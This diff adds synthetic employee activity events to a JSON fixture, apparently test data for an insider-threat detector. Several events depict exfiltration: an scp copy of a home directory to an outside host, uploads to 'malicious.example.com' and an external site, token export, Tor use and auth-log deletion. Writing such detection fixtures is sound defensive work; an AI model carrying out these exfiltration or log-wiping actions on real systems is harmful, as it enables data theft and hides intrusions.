@@ -39,4 +39,309 @@
       "amount": 5000000
     }
   }
+  ,
+  {
+    "id": "evt-5",
+    "employeeId": "emp-001",
+    "timestamp": "2025-09-09T23:15:00.000Z",
+    "action": "download",
+    "ip": "45.77.12.9",
+    "deviceId": "PHONE-UNKNOWN",
+    "details": {
+      "count": 500,
+      "bytes": 2500000000
+    }
+  },
+  {
+    "id": "evt-6",
+    "employeeId": "emp-002",
+    "timestamp": "2025-09-09T20:10:00.000Z",
+    "action": "screenshot",
+    "ip": "10.0.0.7",
+    "deviceId": "HR-LAP-02",
+    "details": {}
+  },
+  {
+    "id": "evt-7",
+    "employeeId": "emp-002",
+    "timestamp": "2025-09-09T20:11:00.000Z",
+    "action": "screenshot",
+    "ip": "10.0.0.7",
+    "deviceId": "HR-LAP-02",
+    "details": {}
+  },
+  {
+    "id": "evt-8",
+    "employeeId": "emp-002",
+    "timestamp": "2025-09-09T20:12:00.000Z",
+    "action": "screenshot",
+    "ip": "10.0.0.7",
+    "deviceId": "HR-LAP-02",
+    "details": {}
+  },
+  {
+    "id": "evt-9",
+    "employeeId": "emp-003",
+    "timestamp": "2025-09-09T11:30:00.000Z",
+    "action": "access_resource",
+    "ip": "10.0.0.8",
+    "deviceId": "AUD-LAP-01",
+    "details": {
+      "resourceType": "payroll"
+    }
+  }
+  ,
+  {
+    "id": "evt-10",
+    "employeeId": "emp-004",
+    "timestamp": "2025-09-10T02:00:00.000Z",
+    "action": "upload",
+    "ip": "52.14.23.45",
+    "deviceId": "ENG-WS-07",
+    "details": {
+      "destination": "https://malicious.example.com/stage",
+      "bytes": 1200000000
+    }
+  },
+  {
+    "id": "evt-11",
+    "employeeId": "emp-005",
+    "timestamp": "2025-09-10T03:15:00.000Z",
+    "action": "login_failed",
+    "ip": "198.51.100.23",
+    "deviceId": "UNKNOWN-01",
+    "details": {}
+  },
+  {
+    "id": "evt-12",
+    "employeeId": "emp-005",
+    "timestamp": "2025-09-10T03:16:00.000Z",
+    "action": "login_failed",
+    "ip": "198.51.100.23",
+    "deviceId": "UNKNOWN-01",
+    "details": {}
+  },
+  {
+    "id": "evt-13",
+    "employeeId": "emp-005",
+    "timestamp": "2025-09-10T03:17:00.000Z",
+    "action": "login_failed",
+    "ip": "198.51.100.23",
+    "deviceId": "UNKNOWN-01",
+    "details": {}
+  },
+  {
+    "id": "evt-14",
+    "employeeId": "emp-005",
+    "timestamp": "2025-09-10T03:18:00.000Z",
+    "action": "login_failed",
+    "ip": "198.51.100.23",
+    "deviceId": "UNKNOWN-01",
+    "details": {}
+  },
+  {
+    "id": "evt-15",
+    "employeeId": "emp-005",
+    "timestamp": "2025-09-10T03:19:00.000Z",
+    "action": "login_failed",
+    "ip": "198.51.100.23",
+    "deviceId": "UNKNOWN-01",
+    "details": {}
+  },
+  {
+    "id": "evt-16",
+    "employeeId": "emp-005",
+    "timestamp": "2025-09-10T03:25:00.000Z",
+    "action": "login",
+    "ip": "203.0.113.77",
+    "deviceId": "MOB-NEW-23",
+    "details": {}
+  },
+  {
+    "id": "evt-17",
+    "employeeId": "emp-006",
+    "timestamp": "2025-09-10T04:00:00.000Z",
+    "action": "grant_privilege",
+    "ip": "10.10.10.10",
+    "deviceId": "ADM-01",
+    "details": {
+      "before": "user",
+      "after": "admin"
+    }
+  },
+  {
+    "id": "evt-18",
+    "employeeId": "emp-007",
+    "timestamp": "2025-09-10T05:10:00.000Z",
+    "action": "process_spawn",
+    "ip": "198.51.100.45",
+    "deviceId": "ENG-WS-11",
+    "details": {
+      "process": "scp -r /home/user/data user@203.0.113.5:/tmp"
+    }
+  },
+  {
+    "id": "evt-19",
+    "employeeId": "emp-008",
+    "timestamp": "2025-09-10T06:00:00.000Z",
+    "action": "email_send",
+    "ip": "10.1.1.5",
+    "deviceId": "MK-01",
+    "details": {
+      "recipients": ["alice@example.com","bob@example.com","carol@example.com","dave@example.com","eve@example.com"],
+      "attachments": 4
+    }
+  },
+  {
+    "id": "evt-20",
+    "employeeId": "emp-009",
+    "timestamp": "2025-09-10T07:00:00.000Z",
+    "action": "gateway_access",
+    "ip": "10.2.2.2",
+    "deviceId": "OPS-02",
+    "details": {
+      "gateway": "gw-unusual-9"
+    }
+  },
+  {
+    "id": "evt-21",
+    "employeeId": "emp-010",
+    "timestamp": "2025-09-10T08:00:00.000Z",
+    "action": "api_call",
+    "ip": "52.12.12.12",
+    "deviceId": "API-CLIENT",
+    "details": {
+      "count": 2500
+    }
+  },
+  {
+    "id": "evt-22",
+    "employeeId": "emp-011",
+    "timestamp": "2025-09-10T09:00:00.000Z",
+    "action": "data_label_change",
+    "ip": "10.3.3.3",
+    "deviceId": "DATA-01",
+    "details": {
+      "change": "remove_sensitive_tag"
+    }
+  }
+  ,
+  {
+    "id": "evt-23",
+    "employeeId": "emp-012",
+    "timestamp": "2025-09-11T01:00:00.000Z",
+    "action": "usb_copy",
+    "ip": "10.4.4.4",
+    "deviceId": "ENG-WS-03",
+    "details": {
+      "bytes": 450000000
+    }
+  },
+  {
+    "id": "evt-24",
+    "employeeId": "emp-013",
+    "timestamp": "2025-09-11T01:05:00.000Z",
+    "action": "export_tokens",
+    "ip": "198.51.100.12",
+    "deviceId": "SRE-01",
+    "details": {
+      "tokensExported": true,
+      "count": 12
+    }
+  },
+  {
+    "id": "evt-25",
+    "employeeId": "emp-014",
+    "timestamp": "2025-09-11T02:10:00.000Z",
+    "action": "vpn_connect",
+    "ip": "203.0.113.33",
+    "deviceId": "MOB-22",
+    "details": {
+      "provider": "Tor Network",
+      "destination": "tor://3g2r..."
+    }
+  },
+  {
+    "id": "evt-26",
+    "employeeId": "emp-015",
+    "timestamp": "2025-09-11T02:15:00.000Z",
+    "action": "archive_create",
+    "ip": "10.5.5.5",
+    "deviceId": "OPS-09",
+    "details": {
+      "archiveName": "sensitive_backup_20250911.tar.gz",
+      "bytes": 800000000
+    }
+  },
+  {
+    "id": "evt-27",
+    "employeeId": "emp-015",
+    "timestamp": "2025-09-11T02:20:00.000Z",
+    "action": "upload",
+    "ip": "10.5.5.5",
+    "deviceId": "OPS-09",
+    "details": {
+      "destination": "https://uploads.example-external.com/tmp",
+      "bytes": 800000000
+    }
+  },
+  {
+    "id": "evt-28",
+    "employeeId": "emp-016",
+    "timestamp": "2025-09-11T03:00:00.000Z",
+    "action": "log_delete",
+    "ip": "10.6.6.6",
+    "deviceId": "SEC-01",
+    "details": {
+      "target": "auth.log",
+      "bytes": 0
+    }
+  },
+  {
+    "id": "evt-29",
+    "employeeId": "emp-017",
+    "timestamp": "2025-09-11T03:30:00.000Z",
+    "action": "file_write",
+    "ip": "10.7.7.7",
+    "deviceId": "DEV-01",
+    "details": {
+      "count": 5000
+    }
+  },
+  {
+    "id": "evt-30",
+    "employeeId": "emp-018",
+    "timestamp": "2025-09-11T03:45:00.000Z",
+    "action": "access_denied",
+    "ip": "10.8.8.8",
+    "deviceId": "MK-02",
+    "details": {}
+  },
+  {
+    "id": "evt-31",
+    "employeeId": "emp-018",
+    "timestamp": "2025-09-11T03:46:00.000Z",
+    "action": "access_denied",
+    "ip": "10.8.8.8",
+    "deviceId": "MK-02",
+    "details": {}
+  },
+  {
+    "id": "evt-32",
+    "employeeId": "emp-018",
+    "timestamp": "2025-09-11T03:47:00.000Z",
+    "action": "access_denied",
+    "ip": "10.8.8.8",
+    "deviceId": "MK-02",
+    "details": {}
+  },
+  {
+    "id": "evt-33",
+    "employeeId": "emp-018",
+    "timestamp": "2025-09-11T03:48:00.000Z",
+    "action": "access_denied",
+    "ip": "10.8.8.8",
+    "deviceId": "MK-02",
+    "details": {}
+  }
 ]
